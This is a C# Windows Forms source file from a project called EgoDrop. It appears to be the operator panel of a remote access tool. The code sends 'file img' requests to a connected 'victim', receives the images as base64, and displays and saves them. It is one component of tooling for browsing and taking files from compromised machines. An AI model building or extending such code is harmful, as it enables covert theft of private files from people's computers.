using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmFileImage : Form
    {
        private clsVictim m_victim { get; set; }

        private ImageList m_ImageList = new ImageList() { ImageSize = new Size(200, 200) };

        public frmFileImage(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private struct stImageInfo
        {
            public string szFileName => szFilePath.Split('/').Last();
            public string szFilePath { get; set; }
            public Image img { get; set; }

            public stImageInfo(string szFilePath, Image img)
            {
                this.szFilePath = szFilePath;
                this.img = img;
            }
        }

        private struct stControl
        {
            public ToolStrip ts;
            public TextBox tbPath;
            public PictureBox pb;

            public stControl(TabPage page)
            {
                Control[] controls = page.Controls.Cast<Control>().ToArray();

                ts = (ToolStrip)controls[0];
                tbPath = (TextBox)controls[1];
                pb = (PictureBox)((Panel)controls[2]).Controls[0];
            }
        }

        private Image fnConvertBufferToImage(byte[] abBuffer)
        {
            using (MemoryStream ms = new MemoryStream(abBuffer))
            {
                Image img = Image.FromStream(ms);
                return img;
            }
        }

        private stImageInfo fnGetStructFromTag(ListViewItem item) => (stImageInfo)item.Tag;

        void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (!clsTools.fnbSameVictim(victim, m_victim))
                return;

            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "file")
                {
                    if (lsMsg[1] == "img")
                    {
                        string szFilePath = lsMsg[2];
                        byte[] abImage = Convert.FromBase64String(lsMsg[3]);

                        if (abImage.Length == 0)
                        {
                            //Handle error.
                            return;
                        }

                        Image img = fnConvertBufferToImage(abImage);
                        m_ImageList.Images.Add(szFilePath, img);

                        stImageInfo st = new stImageInfo(szFilePath, img);
                        ListViewItem item = new ListViewItem(st.szFileName);
                        item.ImageKey = szFilePath;
                        item.Tag = st;

                        listView1.Items.Add(item);

                        toolStripStatusLabel1.Text = $"Image[{listView1.Items.Count}]";
                    }
                }
            }));
        }

        public void fnSendImageRequest(List<string> lsFilePath)
        {
            Task.Run(() =>
            {
                foreach (string szFilePath in lsFilePath)
                {
                    if (m_ImageList.Images.ContainsKey(szFilePath))
                        continue;

                    m_victim.fnSendCommand(new string[]
                    {
                        "file",
                        "img",
                        szFilePath,
                    });
                }
            });
        }

        void fnShowImage(stImageInfo st)
        {
            TabPage page = new TabPage();
            ToolStrip ts = new ToolStrip();
            TextBox tbPath = new TextBox();
            Panel panel = new Panel();
            PictureBox pb = new PictureBox();

            ToolStripComboBox combo = new ToolStripComboBox();
            combo.Items.AddRange(new string[]
            {
                "Zoom",
                "AutoSize",
                "Normal",
                "StretchImage",
                "CenterImage",
            });

            tabControl1.TabPages.Add(page);

            page.Controls.AddRange(new Control[]
            {
                ts,
                tbPath,
                panel,
            });

            panel.Controls.Add(pb);
            panel.AutoScroll = true;

            ts.Dock = DockStyle.Top;
            tbPath.Dock = DockStyle.Top;
            pb.Dock = DockStyle.Fill;

            ts.Font = Font;

            ts.Items.AddRange(new ToolStripItem[]
            {
                new ToolStripLabel() { Text = "SizeMode :" },
                combo,
            });

            page.Text = st.szFileName;
            tbPath.Text = st.szFilePath;
            pb.Image = st.img;

            tabControl1.SelectedTab = page;

            combo.SelectedIndexChanged += (sender, e) =>
            {
                pb.SizeMode = (PictureBoxSizeMode)Enum.Parse(typeof(PictureBoxSizeMode), combo.Text);
            };

            combo.SelectedIndex = 0;
        }

        void fnSetup()
        {
            m_victim.m_listener.evtReceivedMessage += fnRecv;

            m_ImageList.Images.Clear();

            listView1.LargeImageList = m_ImageList;
            listView1.MouseWheel += (sender, e) =>
            {
                if ((ModifierKeys & Keys.Control) == Keys.Control)
                {
                    int nWidth = m_ImageList.ImageSize.Width;
                    int nHeight = m_ImageList.ImageSize.Height;

                    if (e.Delta > 0)
                    {
                        m_ImageList.ImageSize = new Size(nWidth + 10, nHeight + 10);
                    }
                    else
                    {
                        m_ImageList.ImageSize = new Size(nWidth - 10, nHeight - 10);
                    }
                }
            };
        }

        private void frmFileImage_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmFileImage_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecv;
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
            if (item == null)
                return;

            var st = fnGetStructFromTag(item);
            fnShowImage(st);
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {

        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.W)
                {
                    TabPage page = tabControl1.SelectedTab;
                    if (page == null)
                        return;

                    tabControl1.TabPages.Remove(page);
                }
                else if (e.KeyCode == Keys.S)
                {
                    if (tabControl1.SelectedIndex > 0)
                    {
                        TabPage page = tabControl1.SelectedTab;
                        if (page == null)
                            return;

                        var control = new stControl(page);
                        Image img = control.pb.Image;

                        SaveFileDialog sfd = new SaveFileDialog();
                        sfd.Filter = "*.png|PNG File|*.jpg|JPG File|*.bmp|Bitmap File";
                        if (sfd.ShowDialog() == DialogResult.OK)
                        {
                            img.Save(sfd.FileName);
                            if (File.Exists(sfd.FileName))
                            {
                                clsTools.fnShowInfoMsgbox("Save file successfully: " + sfd.FileName, "OK");
                            }
                        }
                    }
                }
                else if (e.KeyCode == Keys.A)
                {
                    foreach (ListViewItem item in listView1.Items)
                        item.Selected = true;
                }
            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            List<stImageInfo> lInfo = listView1.SelectedItems.Cast<ListViewItem>().ToList().Select(x => fnGetStructFromTag(x)).ToList();
            if (lInfo.Count == 1)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    lInfo.First().img.Save(sfd.FileName);
                    if (File.Exists(sfd.FileName))
                        clsTools.fnShowInfoMsgbox("Save image successfully.");
                    else
                        clsTools.fnShowInfoMsgbox("Save image failed.");
                }
            }
            else if (lInfo.Count > 1)
            {
                FolderBrowserDialog fbd = new FolderBrowserDialog();
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    foreach (var info in lInfo)
                    {
                        string szFilePath = Path.Combine(fbd.SelectedPath, info.szFileName);
                        info.img.Save(szFilePath);
                    }

                    clsTools.fnShowInfoMsgbox("Save images successfully.");
                }
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            List<stImageInfo> lInfo = listView1.SelectedItems.Cast<ListViewItem>().ToList().Select(x => fnGetStructFromTag(x)).ToList();
            foreach (var info in lInfo)
                fnShowImage(info);
        }
    }
}
